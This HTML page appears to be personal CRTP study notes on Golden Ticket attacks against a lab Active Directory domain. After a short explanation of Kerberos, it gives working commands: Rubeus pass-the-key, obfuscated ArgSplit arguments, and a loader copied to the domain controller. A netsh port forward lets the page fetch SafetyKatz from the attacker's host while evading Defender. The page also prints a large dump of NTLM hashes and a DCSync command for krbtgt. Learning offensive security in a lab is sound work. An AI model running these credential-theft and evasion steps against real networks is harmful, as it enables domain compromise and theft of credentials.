@@ -1,0 +1,2011 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CRTP Part 6 - Golden Ticket | Mr Stark Study Notes</title>
+
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  
+  <style>
+    .goad-content {
+      max-width: 100%;
+      margin: 0 auto;
+      padding: 30px;
+      font-size: 20px;
+    }
+    
+    .goad-content h1 {
+      color: var(--white-2);
+      font-size: 36px;
+      margin-bottom: 25px;
+    }
+    
+    .goad-content h2 {
+      color: var(--orange-yellow-crayola);
+      font-size: 30px;
+      margin: 35px 0 20px 0;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--jet);
+    }
+    
+    .goad-content h3 {
+      color: var(--white-1);
+      font-size: 26px;
+      margin: 30px 0 15px 0;
+    }
+    
+    .goad-content h4 {
+      color: var(--white-2);
+      font-size: 24px;
+      margin: 25px 0 15px 0;
+    }
+    
+    .goad-content p {
+      color: var(--light-gray);
+      margin-bottom: 18px;
+      line-height: 1.8;
+      font-size: 20px;
+    }
+    
+    .goad-content code {
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-family: 'Courier New', monospace;
+      font-size: 18px;
+    }
+    
+    .goad-content pre {
+      background: var(--eerie-black-2);
+      border: 1px solid var(--jet);
+      border-radius: 8px;
+      padding: 20px;
+      overflow-x: auto;
+      margin: 20px 0;
+      max-width: 100%;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+    }
+    
+    .goad-content pre code {
+      background: transparent;
+      color: var(--light-gray);
+      padding: 0;
+      font-size: 18px;
+    }
+    
+    .goad-content img {
+      max-width: 100%;
+      border-radius: 8px;
+      margin: 25px 0;
+      border: 1px solid var(--jet);
+    }
+    
+    .goad-content ul, .goad-content ol {
+      color: var(--light-gray);
+      margin: 20px 0;
+      padding-left: 40px;
+      font-size: 20px;
+    }
+    
+    .goad-content li {
+      margin-bottom: 10px;
+      color: var(--light-gray);
+    }
+    
+    .goad-content strong {
+      color: var(--white-2);
+    }
+    
+    .goad-content blockquote {
+      border-left: 3px solid var(--orange-yellow-crayola);
+      padding-left: 20px;
+      margin: 20px 0;
+      color: var(--light-gray);
+      font-style: italic;
+      font-size: 20px;
+    }
+    
+    .goad-sidebar-list {
+      list-style: none;
+      padding: 0;
+    }
+    
+    .goad-sidebar-list li {
+      margin-bottom: 8px;
+    }
+    
+    .goad-sidebar-list a {
+      color: var(--light-gray);
+      text-decoration: none;
+      display: block;
+      padding: 10px 15px;
+      border-radius: 8px;
+      transition: all 0.3s;
+      font-size: 16px;
+    }
+    
+    .goad-sidebar-list a:hover,
+    .goad-sidebar-list a.active {
+      background: var(--onyx);
+      color: var(--orange-yellow-crayola);
+    }
+    
+    .goad-sidebar-list a.active {
+      background: var(--orange-yellow-crayola);
+      color: var(--eerie-black-1);
+      font-weight: var(--fw-500);
+    }
+    
+    .back-link {
+      color: var(--light-gray);
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 25px;
+      font-size: 16px;
+    }
+    
+    .back-link:hover {
+      color: var(--orange-yellow-crayola);
+    }
+  </style>
+</head>
+
+<body>
+
+  <main>
+
+    <!-- Sidebar -->
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTP Series</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Parts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        
+        <a href="../index.html" class="back-link">
+          <ion-icon name="arrow-back-outline"></ion-icon>
+          Back to Portfolio
+        </a>
+        
+        <div class="separator"></div>
+        
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Select Part:</p>
+        
+        <ul class="goad-sidebar-list">
+          <li><a href="index.html">Overview</a></li>
+          <li><a href="part-1-powershell-overview.html">PowerShell Overview</a></li>
+          <li><a href="part-2-powershell-detections.html">PowerShell Detections</a></li>
+          <li><a href="part-3-enumeration.html">Enumeration</a></li>
+          <li><a href="part-4-privilege-escalation.html">Privilege Escalation</a></li>
+          <li><a href="part-5-privesc-domain-admin.html">Privilege Escalation via Domain Admin</a></li>
+          <li><a href="part-6-golden-ticket.html" class="active">Golden Ticket</a></li>
+          <li><a href="part-7-silver-ticket.html">Silver Ticket</a></li>
+          <li><a href="part-8-diamond-ticket.html">Diamond Ticket</a></li>
+          <li><a href="part-9-dsrm-credentials.html">Abusing DSRM Credentials</a></li>
+          <li><a href="part-10-dcsync-attack.html">DCSync Attack</a></li>
+          <li><a href="part-11-security-descriptor.html">Security Descriptor Abuse</a></li>
+          <li><a href="part-12-asrep-roasting.html">ASREP-Roasting Attack</a></li>
+          <li><a href="part-13-unconstrained-delegation.html">Unconstrained Delegation</a></li>
+          <li><a href="part-14-constrained-delegation.html">Constrained Delegation</a></li>
+          <li><a href="part-15-rbcd.html">Resource-Based Constrained Delegation</a></li>
+          <li><a href="part-16-enterprise-trust-ticket.html">Enterprise Trust - SID-History with Trust Ticket</a></li>
+          <li><a href="part-17-enterprise-krbtgt.html">Enterprise Trust - SID-History with KRBTGT</a></li>
+          <li><a href="part-18-crossforest-trust.html">CrossForest Trust - Trust Flow</a></li>
+          <li><a href="part-19-adcs-attacks.html">ADCS Attacks</a></li>
+          <li><a href="part-20-trust-links.html">Trust Links Abuse</a></li>
+          <li><a href="part-21-mde-mdi-bypass.html">MDE/MDI Bypass</a></li>
+        </ul>
+
+        <div class="separator"></div>
+        
+        <ul class="social-list">
+          <li class="social-item">
+            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
+              <ion-icon name="logo-github"></ion-icon>
+            </a>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <!-- Main Content -->
+    <div class="main-content">
+
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Golden Ticket</header>
+        
+        <section class="goad-content">
+          
+<h1>CRTP - Certified Red Team Professional</h1>
+
+
+<h2>Golden Ticket</h2>
+
+
+<p>Golden Ticket attacks are intertwined with the open source tool Mimikatz, which is an open-source tool created in 2011 as a way to demonstrate the flaws in Microsoft Windows. It extracts credentials such as usernames, passwords, hashes and Kerberos tickets. </p>
+<p>The Golden Ticket attack was named such because it exploits a vulnerability in the Kerberos authentication protocol. Just like in the book and movie Charlie and the Chocolate Factory, where the name comes from, the attack is a Golden Ticket that allows unlimited access, but instead of a well-guarded candy factory, it’s to bypass a company’s cybersecurity and gain access to its resources, files, computers and domain controllers.</p>
+<h2>How does a Golden Ticket attack work?</h2>
+
+
+<p>Typically, Kerberos authentication uses a key distribution center to protect and verify a user’s identity. With this system, the goal is to eliminate the need for multiple credential requests to the user, and instead verifies the user’s identity and assigns a ticket to the user for access. </p>
+<p>The Distribution center has the ticket-granting server, or TGS, which will connect the user to the service server. The Kerberos database contains the password of all verified users. The authentication server, or AS, performs the initial authentication of the user. </p>
+<p>If AS is verified then the user gets a Kerberos Ticket Grant Ticket, or TGT, which is proof of authentication.</p>
+<h3>How do attackers perform Golden Ticket attacks?</h3>
+
+
+<p>To carry out a Golden Ticket attack, the attacker needs the fully qualified domain name, the security identifier of the domain, the KRBTGT password hash and the username of the account they are going to access. </p>
+<p>The steps below detail how an attacker gets this information, and how they are then able to carry out the attack.</p>
+<p>Step 1. Investigate: An attacker must already have access to the system. Often, phishing emails are used to first gain access to the system. Attackers will then investigate and gather intel like the domain name.</p>
+<p>Step 2. Steal Access: After an attacker has access to the domain controller, they will then steal an NTLM hash of the Active Directory Key Distribution Service Account (KRBTGT). They might use techniques such as Pass-the-Hash (PtH) because unlike other credential theft attacks, this attack does not require the attacker to crack the password.</p>
+<p>Step 3. Launch Attack: Once an attacker has the password for the KRBTGT, they can get a TGT, which then allows access to the domain controller, and verifies the identity of the server. The TGTs also grants the attacker unrestricted access to resources to assign others any domain-related tasks and allows them to create tickets.</p>
+<p>Step 4. Retain Access: The ticket can be made valid for up to 10 years, and this type of attack is often not detected. Generally, attackers will set the tickets to be valid for a shorter period of time to further escape detection.</p>
+
+<p>For this demonstration, I already have local administrative access on a domain computer. Now, I will utilize Rubeus.exe to escalate privileges by initiating a new process with Domain Admin privileges. This will allow me to extract secrets from the domain controller of dollarcorp. Next, I will use the secrets of the krbtgt account to create a Golden ticket. Finally, I will use the Golden ticket to regain Domain Admin privileges on a machine.</p>
+
+<p>There are a few key reasons why you might perform a Golden Ticket attack even if you already have Domain Admin privileges during a penetration test:</p>
+<p>1. Persistence and Long-Term Access: A Golden Ticket provides long-term persistence and access to the domain, even if the original Domain Admin account is discovered or disabled. The Golden Ticket can remain valid for up to 10 years, allowing you to maintain access.</p>
+<p>1. Stealth and Evasion: Golden Ticket attacks are difficult to detect because they use legitimate Kerberos tickets and traffic. This makes it harder for defenders to identify and remediate the attack.</p>
+<p>1. Expanded Access: With a Golden Ticket, you can impersonate any user in the domain, including those with additional privileges beyond just Domain Admin. This can allow you to access resources that the original Domain Admin account may not have had access to.</p>
+<p>1. Demonstration of Impact: Performing a Golden Ticket attack, even with existing Domain Admin privileges, can help demonstrate the severe impact and risk of this technique to the organization. It shows how a single compromised KRBTGT account hash can lead to complete domain compromise.</p>
+<p>1. Testing Detection and Response: Executing a Golden Ticket attack can help test the organization's ability to detect and respond to this type of advanced threat, even when the attacker already has high-level access.</p>
+
+<h1>Golden Ticket using Rubeus.exe</h1>
+
+
+<p>PELoader.exe is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only, it is also good that we execute ArgSplit.bat first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
+<p>golden</p>
+<pre><code>set "z=n"
+set "y=e"
+set "x=d"
+set "w=l"
+set "v=o"
+set "u=g"
+set "Pwn=%u%%v%%w%%x%%y%%z%"</code></pre>
+
+
+<p>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</p>
+<img src="./images/screenshot_61.png" alt="">
+
+
+<p>Once we were able to to run a new process as Domain Admin, let’s use this new CMD session to copy PELoaded.exe into our Domain Controller.</p>
+<p>Why are we copying PELoader.exe into Domain Controller? Because once again we want to execute the payloads from the memory, we don’t want to touch the disk at all.</p>
+
+<p>echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y</p>
+<img src="./images/screenshot_62.png" alt="">
+
+
+<p>Ok, now let’s remotely access the Domain Controller using WinRS</p>
+
+<p>winrs -r:dcorp-dc cmd</p>
+
+<p>Now if we try to run PELoader.exe straight on the target machine dcorp-dc to execute SafatyKatz.exe  on the target, we may get caught by the Windows Defender, because we are downloading and running an executable file from our remote server. </p>
+<p>To avoid getting caught we can do a portforwarding.</p>
+<p>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.51</p>
+<p>For you to understand why we are using the loopback IP(127.0.0.1) in our command, during our portforwarding command we specified that whatever comes from any direction(0.0.0.0) to port 8080 should be redirected to our(attacker) IP in port 80, this way, Windows Defender will think that we are downloading and executing SafetyKatz.exe from our the local  web server(in this case  from the target itself), but the request is forwarded to our web server machine where we are hosting the SafetyKatz.exe.</p>
+
+<p>Now let’s use ArgSplit.bat on our attacking machine once again to encode “lsadump::lsa” and copy it to the session with the Domain Admin. as you can see in the screenshot below.</p>
+<img src="./images/screenshot_63.png" alt="">
+
+
+<p>We have do encoded code below for the argument “lsadump::lsa” . Please also pay attention to this, copy encoded lines to the Domain Admin Session one by one. I tried to do a full copy paste and it create a bug on the execution of the payload.</p>
+<pre><code>set "z=a"
+set "y=s"
+set "x=l"
+set "w=:"
+set "v=:"
+set "u=p"
+set "t=m"
+set "s=u"
+set "r=d"
+set "q=a"
+set "p=s"
+set "o=l"
+set "Pwn=%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"</code></pre>
+
+
+
+<p>Now we can Download SafetyKatz.exe and execute it in memory… The only moment we are touching the target disk is when we download PELoader.exe, SafetyKatz.exe is being executing in memory and not in the disk at all.</p>
+<p>C:\Public>C:\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "%Pwn% /patch" "exit"</p>
+<pre><code>Domain : dcorp / S-1-5-21-719815819-3726368948-3917688648
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : af0686cc0ca8f04df42210c9ac980760
+
+RID  : 000001f5 (501)
+User : Guest
+LM   :
+NTLM :
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   :
+NTLM : 4e9815869d2090ccfca61c1fe0d23986
+
+RID  : 00000459 (1113)
+User : sqladmin
+LM   :
+NTLM : 07e8be316e3da9a042a9cb681df19bf5
+
+RID  : 0000045a (1114)
+User : websvc
+LM   :
+NTLM : cc098f204c5887eaa8253e7c2749156f
+
+RID  : 0000045b (1115)
+User : srvadmin
+LM   :
+NTLM : a98e18228819e8eec3dfa33cb68b0728
+
+RID  : 0000045d (1117)
+User : appadmin
+LM   :
+NTLM : d549831a955fee51a43c83efb3928fa7
+
+RID  : 0000045e (1118)
+User : svcadmin
+LM   :
+NTLM : b38ff50264b74508085d82c69794a4d8
+
+RID  : 0000045f (1119)
+User : testda
+LM   :
+NTLM : a16452f790729fa34e8f3a08f234a82c
+
+RID  : 00000460 (1120)
+User : mgmtadmin
+LM   :
+NTLM : 95e2cd7ff77379e34c6e46265e75d754
+
+RID  : 00000461 (1121)
+User : ciadmin
+LM   :
+NTLM : e08253add90dccf1a208523d02998c3d
+
+RID  : 00000462 (1122)
+User : sql1admin
+LM   :
+NTLM : e999ae4bd06932620a1e78d2112138c6
+
+RID  : 00001055 (4181)
+User : studentadmin
+LM   :
+NTLM : d1254f303421d3cdbdc4c73a5bce0201
+
+RID  : 00003521 (13601)
+User : student441
+LM   :
+NTLM : f35f143c13eee7ec6dbfe94c8976b740
+
+RID  : 00003522 (13602)
+User : student442
+LM   :
+NTLM : 953da8cbdab52254995f7652ab7d6e36
+
+RID  : 00003523 (13603)
+User : student443
+LM   :
+NTLM : 126769e11080d8193c17098c80d96f4a
+
+RID  : 00003524 (13604)
+User : student444
+LM   :
+NTLM : 4f37000dec520d9cb90095a92e6fdabe
+
+RID  : 00003525 (13605)
+User : student445
+LM   :
+NTLM : eec9112ec22e2fc4dc6e0ab5319b667c
+
+RID  : 00003526 (13606)
+User : student446
+LM   :
+NTLM : c2c421bb7b043cb57dadc5770f9f73d2
+
+RID  : 00003527 (13607)
+User : student447
+LM   :
+NTLM : 17a7fd1f569081a534f56b07cf70f1df
+
+RID  : 00003528 (13608)
+User : student448
+LM   :
+NTLM : d5f9e8672c6f64526c1099246a5565f4
+
+RID  : 00003529 (13609)
+User : student449
+LM   :
+NTLM : 6d37173e0de202f6630231dc06e5bb13
+
+RID  : 0000352a (13610)
+User : student450
+LM   :
+NTLM : c2ed42e66206f561d266c3846844fce9
+
+RID  : 0000352b (13611)
+User : student451
+LM   :
+NTLM : 4b11f749c331826c9f1197b617fb47a2
+
+RID  : 0000352c (13612)
+User : student452
+LM   :
+NTLM : 91b5329ca1d44b91502b5f0d93576495
+
+RID  : 0000352d (13613)
+User : student453
+LM   :
+NTLM : abac3975bdb8763dbe96600a2befb3ed
+
+RID  : 0000352e (13614)
+User : student454
+LM   :
+NTLM : 0dd4bf508e520534d215eb73b94094f1
+
+RID  : 0000352f (13615)
+User : student455
+LM   :
+NTLM : e213e2c54ac00bb713a54255cd9b16eb
+
+RID  : 00003530 (13616)
+User : student456
+LM   :
+NTLM : 205efd7b34d015a84c3638f549c7028f
+
+RID  : 00003531 (13617)
+User : student457
+LM   :
+NTLM : 01f47fdd2648ff34bf65365c612768ab
+
+RID  : 00003532 (13618)
+User : student458
+LM   :
+NTLM : 688fa7689cc985eee3b265d9f3fc0707
+
+RID  : 00003533 (13619)
+User : student459
+LM   :
+NTLM : c109389efb9c32b8f6fc21739e3dd51e
+
+RID  : 00003534 (13620)
+User : student460
+LM   :
+NTLM : 85fa1dedc18f503b603322d631cbda56
+
+RID  : 00003535 (13621)
+User : Control441user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003536 (13622)
+User : Control442user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003537 (13623)
+User : Control443user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003538 (13624)
+User : Control444user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003539 (13625)
+User : Control445user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000353a (13626)
+User : Control446user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000353b (13627)
+User : Control447user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000353c (13628)
+User : Control448user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000353d (13629)
+User : Control449user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000353e (13630)
+User : Control450user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 0000353f (13631)
+User : Control451user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003540 (13632)
+User : Control452user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003541 (13633)
+User : Control453user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003542 (13634)
+User : Control454user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003543 (13635)
+User : Control455user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003544 (13636)
+User : Control456user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003545 (13637)
+User : Control457user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003546 (13638)
+User : Control458user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003547 (13639)
+User : Control459user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003548 (13640)
+User : Control460user
+LM   :
+NTLM : c8aed8673aca42f9a83ff8d2c84860f0
+
+RID  : 00003549 (13641)
+User : Support441user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000354a (13642)
+User : Support442user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000354b (13643)
+User : Support443user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000354c (13644)
+User : Support444user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000354d (13645)
+User : Support445user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000354e (13646)
+User : Support446user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000354f (13647)
+User : Support447user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003550 (13648)
+User : Support448user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003551 (13649)
+User : Support449user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003552 (13650)
+User : Support450user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003553 (13651)
+User : Support451user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003554 (13652)
+User : Support452user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003555 (13653)
+User : Support453user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003556 (13654)
+User : Support454user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003557 (13655)
+User : Support455user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003558 (13656)
+User : Support456user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 00003559 (13657)
+User : Support457user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000355a (13658)
+User : Support458user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000355b (13659)
+User : Support459user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000355c (13660)
+User : Support460user
+LM   :
+NTLM : b2e40f5d46efcbb1094704aeb7d9cbe7
+
+RID  : 0000355d (13661)
+User : VPN441user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000355e (13662)
+User : VPN442user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000355f (13663)
+User : VPN443user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003560 (13664)
+User : VPN444user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003561 (13665)
+User : VPN445user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003562 (13666)
+User : VPN446user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003563 (13667)
+User : VPN447user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003564 (13668)
+User : VPN448user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003565 (13669)
+User : VPN449user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003566 (13670)
+User : VPN450user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003567 (13671)
+User : VPN451user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003568 (13672)
+User : VPN452user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003569 (13673)
+User : VPN453user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000356a (13674)
+User : VPN454user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000356b (13675)
+User : VPN455user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000356c (13676)
+User : VPN456user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000356d (13677)
+User : VPN457user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000356e (13678)
+User : VPN458user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 0000356f (13679)
+User : VPN459user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 00003570 (13680)
+User : VPN460user
+LM   :
+NTLM : bb1d7a9ac6d4f535e1986ddbc5428881
+
+RID  : 000003e8 (1000)
+User : DCORP-DC$
+LM   :
+NTLM : 0cfa3b5634cebb44153fa03a3767d396
+
+RID  : 00000451 (1105)
+User : DCORP-ADMINSRV$
+LM   :
+NTLM : b5f451985fd34d58d5120816d31b5565
+
+RID  : 00000452 (1106)
+User : DCORP-APPSRV$
+LM   :
+NTLM : b4cb7bf8b93c78b8051c7906bb054dc5
+
+RID  : 00000453 (1107)
+User : DCORP-CI$
+LM   :
+NTLM : f76f48c176dc09cfd5765843c32809f3
+
+RID  : 00000454 (1108)
+User : DCORP-MGMT$
+LM   :
+NTLM : 0878da540f45b31b974f73312c18e754
+
+RID  : 00000455 (1109)
+User : DCORP-MSSQL$
+LM   :
+NTLM : b205f1ca05bedace801893d6aa5aca27
+
+RID  : 00000456 (1110)
+User : DCORP-SQL1$
+LM   :
+NTLM : 3686dfb420dc0f9635e70c6ca5875b49
+
+RID  : 0000106a (4202)
+User : DCORP-STDADMIN$
+LM   :
+NTLM : e444bbf444732fc38065ea9e9255ab03
+
+RID  : 00003571 (13681)
+User : DCORP-STD441$
+LM   :
+NTLM : 82e28989368af88aa0f035ddff4ad072
+
+RID  : 00003572 (13682)
+User : DCORP-STD442$
+LM   :
+NTLM : e7b7c190753d2ab29967865be6d260de
+
+RID  : 00003573 (13683)
+User : DCORP-STD443$
+LM   :
+NTLM : 8f19dbf75e46fbcc0aa7a9ff41f8f3b0
+
+RID  : 00003574 (13684)
+User : DCORP-STD444$
+LM   :
+NTLM : 804bfc109ef5380520b30efb99520680
+
+RID  : 00003575 (13685)
+User : DCORP-STD445$
+LM   :
+NTLM : 2e03f920b8f2bc2ccfb7d312d68154bc
+
+RID  : 00003576 (13686)
+User : DCORP-STD446$
+LM   :
+NTLM : d2da89b734dece788a5749e1fe3b269e
+
+RID  : 00003577 (13687)
+User : DCORP-STD447$
+LM   :
+NTLM : 03a5a6659bd09d1a13a17a981154f191
+
+RID  : 00003578 (13688)
+User : DCORP-STD448$
+LM   :
+NTLM : f69a2bce7a6fc3ece8a31b74bbb0a011
+
+RID  : 00003579 (13689)
+User : DCORP-STD449$
+LM   :
+NTLM : b130f0e8b8e9f57dca7cab4c38b9e4cb
+
+RID  : 0000357a (13690)
+User : DCORP-STD450$
+LM   :
+NTLM : 90ea7964ab6f9a8ad85222b4a7a04696
+
+RID  : 0000357b (13691)
+User : DCORP-STD451$
+LM   :
+NTLM : ff6cc4201e8eced9bfb472b4a512be5a
+
+RID  : 0000357c (13692)
+User : DCORP-STD452$
+LM   :
+NTLM : e1492c5446ef8f1d20bbfd7b94621add
+
+RID  : 0000357d (13693)
+User : DCORP-STD453$
+LM   :
+NTLM : 9bb950aacf6af1252ff0c83807d2a7c0
+
+RID  : 0000357e (13694)
+User : DCORP-STD454$
+LM   :
+NTLM : c152cec4f187e3330a8f643f7895d4e8
+
+RID  : 0000357f (13695)
+User : DCORP-STD455$
+LM   :
+NTLM : 5f792dbfde97d440bac506b740f5ec99
+
+RID  : 00003580 (13696)
+User : DCORP-STD456$
+LM   :
+NTLM : 29a12940c0b9b39aff5cc795bec365d3
+
+RID  : 00003581 (13697)
+User : DCORP-STD457$
+LM   :
+NTLM : a74b5162dd8790d322466f592b7bd45a
+
+RID  : 00003582 (13698)
+User : DCORP-STD458$
+LM   :
+NTLM : 2c7ccb4be7427ca4e74ecf0023b92ada
+
+RID  : 00003583 (13699)
+User : DCORP-STD459$
+LM   :
+NTLM : 20a2fd33769d00e27939b054c4813021
+
+RID  : 00003584 (13700)
+User : DCORP-STD460$
+LM   :
+NTLM : 5162999bfd616ca987090aa2f6222f10
+
+RID  : 0000044f (1103)
+User : mcorp$
+LM   :
+NTLM : 7d446c3b1516b4b988d7e07e67b221e5
+
+RID  : 00000450 (1104)
+User : US$
+LM   :
+NTLM : f85385d81cc4936d37ff8f27813f43c6
+
+RID  : 00000458 (1112)
+User : ecorp$
+LM   :
+NTLM : 75788d7b488dbc0dbccff755b53494f0</code></pre>
+
+
+<p>You can see from the output above, that we were able to extract the secrets from the domain controller. </p>
+<p>Meaning that we were able to get the whole Domain accounts NTLM hashes. I highlighted the most important ones in red on top of the output.</p>
+
+<p>So, for our Golden Ticket attack, what we really need here is NTLM and AES key of KRBTGT account, to get this, let’s do a DCSync Attack. Let’s encode our SafetyKatz.exe command with ArgSplit.bat once again and send it to the Domain Admin Session. </p>
+<p>For this DCSync attack to work, we don’t need to connect to the Domain Controller, in this case we don’t need to be inside DCORP-DC machine, It will be executed from our attacking machine using the Domain Admin Session.</p>
+
+<p>Let’s encode the SafetyKatz payload once again using ArgSplit.bat… Since we are running this locally and not with a remote session to another machine we can simply do a copy/paste.</p>
+<pre><code>[!] Argument Limit: 180 characters
+[+] Enter a string: lsadump::dcsync
+set "z=c"
+set "y=n"
+set "x=y"
+set "w=s"
+set "v=c"
+set "u=d"
+set "t=:"
+set "s=:"
+set "r=p"
+set "q=m"
+set "p=u"
+set "o=d"
+set "n=a"
+set "m=s"
+set "l=l"
+set "Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"</code></pre>
+
+
+
+<p>Now let’s load SafetyKatz.exe and execute it from the memory using PELoader.exe.</p>
+<p>C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:dcorp\krbtgt" "exit"</p>
